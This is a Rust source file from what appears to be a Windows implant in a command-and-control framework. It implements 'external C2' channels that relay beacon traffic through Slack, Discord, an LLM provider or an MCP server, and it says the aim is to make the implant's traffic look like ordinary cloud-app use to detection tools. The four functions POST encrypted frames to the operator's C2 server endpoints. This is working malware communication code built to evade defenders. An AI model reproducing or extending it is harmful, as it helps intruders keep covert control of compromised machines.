//! External C2 channels — Slack / Discord / LLM / MCP (spec-6).
//!
//! These are the "external C2" transports inspired by BRC4: beacon traffic is
//! relayed through a legitimate third-party API (Slack, Discord, an LLM
//! provider, or an MCP server) so the implant's network egress looks like
//! ordinary cloud-app usage to EDR/NIDS.
//!
//! ## Simplified architecture
//!
//! Rather than teaching the no_std, WinHTTP-only implant each provider's OAuth
//! flow / message format (chat.postMessage, webhook JSON, Anthropic Messages,
//! MCP JSON-RPC), the implant POSTs the *raw* encrypted frame to a per-service
//! endpoint on the C2 server itself:
//!
//! - Slack   → `{server}/extc2/slack`
//! - Discord → `{server}/extc2/discord`
//! - LLM     → `{server}/extc2/llm`
//! - MCP     → `{server}/extc2/mcp`
//!
//! The team server (which can use a full HTTP client with `std`) is then free
//! to fan the frame out to the real third-party API and relay the reply back.
//! This keeps the implant-side implementation uniform (one WinHTTP POST with a
//! different path) while leaving the provider-specific shaping on the server,
//! where rich libraries are available. Because the wire body is already an
//! AEAD-encrypted frame, the simplified path is cryptographically equivalent to
//! the direct-to-provider path.
//!
//! Each function gates on `ctx.extc2_token` (and `ctx.extc2_api_host`): if
//! either is unset (empty), the channel is treated as unconfigured and returns
//! `None` with a diagnostic marker, so the dispatcher's fallback chain can move
//! on instead of emitting an unauthenticated request.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use super::ChannelCtx;

/// Post `frame` to the Slack external-C2 endpoint on the C2 server.
///
/// The server endpoint `/extc2/slack` relays the frame to the real Slack API.
/// Requires `ctx.extc2_token` (the bot/webhook token) and `ctx.extc2_api_host`
/// to be configured; returns `None` + a diagnostic marker otherwise so the
/// beacon's fallback chain can pick another channel.
pub unsafe fn slack_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    if ctx.extc2_token.is_empty() || ctx.extc2_api_host.is_empty() {
        crate::entry::diag_mark(b"ERR_CH_SLACK_NOCONF");
        return None;
    }
    unsafe {
        crate::transport::post_frame(
            ctx.server_host.as_bytes(),
            ctx.server_port,
            b"/extc2/slack",
            frame,
            ctx.use_tls,
        )
    }
}

/// Post `frame` to the LLM (Anthropic) external-C2 endpoint on the C2 server.
///
/// The server endpoint `/extc2/llm` relays the frame to the real Anthropic
/// Messages API (or whichever LLM provider the operator configured). Requires
/// `ctx.extc2_token` (the API key) and `ctx.extc2_api_host` to be configured.
pub unsafe fn llm_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    if ctx.extc2_token.is_empty() || ctx.extc2_api_host.is_empty() {
        crate::entry::diag_mark(b"ERR_CH_LLM_NOCONF");
        return None;
    }
    unsafe {
        crate::transport::post_frame(
            ctx.server_host.as_bytes(),
            ctx.server_port,
            b"/extc2/llm",
            frame,
            ctx.use_tls,
        )
    }
}

/// Post `frame` to the MCP JSON-RPC external-C2 endpoint on the C2 server.
///
/// The server endpoint `/extc2/mcp` relays the frame to the configured MCP
/// server via `tools/call`. Requires `ctx.extc2_token` and
/// `ctx.extc2_api_host` to be configured.
pub unsafe fn mcp_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    if ctx.extc2_token.is_empty() || ctx.extc2_api_host.is_empty() {
        crate::entry::diag_mark(b"ERR_CH_MCP_NOCONF");
        return None;
    }
    unsafe {
        crate::transport::post_frame(
            ctx.server_host.as_bytes(),
            ctx.server_port,
            b"/extc2/mcp",
            frame,
            ctx.use_tls,
        )
    }
}

/// Post `frame` to the Discord webhook/bot external-C2 endpoint on the C2 server.
///
/// The server endpoint `/extc2/discord` relays the frame to the real Discord
/// webhook or bot API. Requires `ctx.extc2_token` (the webhook URL / bot token)
/// and `ctx.extc2_api_host` to be configured.
pub unsafe fn discord_send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    if ctx.extc2_token.is_empty() || ctx.extc2_api_host.is_empty() {
        crate::entry::diag_mark(b"ERR_CH_DISCORD_NOCONF");
        return None;
    }
    unsafe {
        crate::transport::post_frame(
            ctx.server_host.as_bytes(),
            ctx.server_port,
            b"/extc2/discord",
            frame,
            ctx.use_tls,
        )
    }
}
